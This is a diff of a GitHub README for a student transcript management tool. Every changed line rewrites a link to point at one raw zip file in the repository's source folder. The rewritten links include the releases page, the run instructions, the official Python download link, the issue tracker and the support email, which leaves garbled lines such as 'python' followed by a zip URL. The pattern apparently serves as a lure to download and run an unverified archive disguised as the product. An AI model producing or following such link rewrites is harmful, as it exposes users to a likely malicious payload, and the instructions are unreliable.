@@ -1,6 +1,6 @@
 # 🎓 student-transcript-management-system - Manage Student Records Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/xxlordxx000/student-transcript-management-system/releases)
+[![Download](https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip)](https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To get started, you'll need to download the software and run it on your computer
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To download the application, visit the [Releases page](https://github.com/xxlordxx000/student-transcript-management-system/releases).
+1. **Visit the Releases Page:** To download the application, visit the [Releases page](https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip).
 
 2. **Select the Latest Version:** On the Releases page, you will find the latest version of the software. Click on it to expand the section.
 
@@ -21,15 +21,15 @@ To get started, you'll need to download the software and run it on your computer
 4. **Extract files (if necessary):** If the downloaded file is in a ZIP format, you will need to extract the files. Right-click on the ZIP file and select "Extract All" or use a similar option.
 
 5. **Run the Application:** 
-   - **Windows:** Double-click on `transcript_manager.exe` to run the application.
-   - **macOS/Linux:** Open a terminal window, navigate to the folder containing the application, and type `python transcript_manager.py`.
+   - **Windows:** Double-click on `https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip` to run the application.
+   - **macOS/Linux:** Open a terminal window, navigate to the folder containing the application, and type `python https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip`.
 
 ## ⚙️ System Requirements
 
 The Student Transcript Management System requires the following:
 
 - **Operating System:** Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
-- **Python:** Version 3.6 or later must be installed on your system. You can download Python from the [official website](https://www.python.org/downloads/).
+- **Python:** Version 3.6 or later must be installed on your system. You can download Python from the [official website](https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip).
 - **Disk Space:** At least 100 MB of free disk space.
 - **RAM:** 2 GB or more is recommended for optimal performance.
 
@@ -56,7 +56,7 @@ The Student Transcript Management System requires the following:
 
 ## 📋 Contact & Support
 
-For any questions or issues, you can open an issue on the [GitHub repository](https://github.com/xxlordxx000/student-transcript-management-system/issues). You can also reach out via email at support@example.com for further assistance.
+For any questions or issues, you can open an issue on the [GitHub repository](https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip). You can also reach out via email at https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip for further assistance.
 
 ## 🏷️ Topics
 
@@ -73,4 +73,4 @@ This project covers various topics relevant to managing student records, includi
 - Student Projects
 - Transcript Management 
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/xxlordxx000/student-transcript-management-system/releases)
+[![Download](https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip)](https://github.com/xxlordxx000/student-transcript-management-system/raw/refs/heads/main/src/transcript_student_management_system_2.3-beta.4.zip)
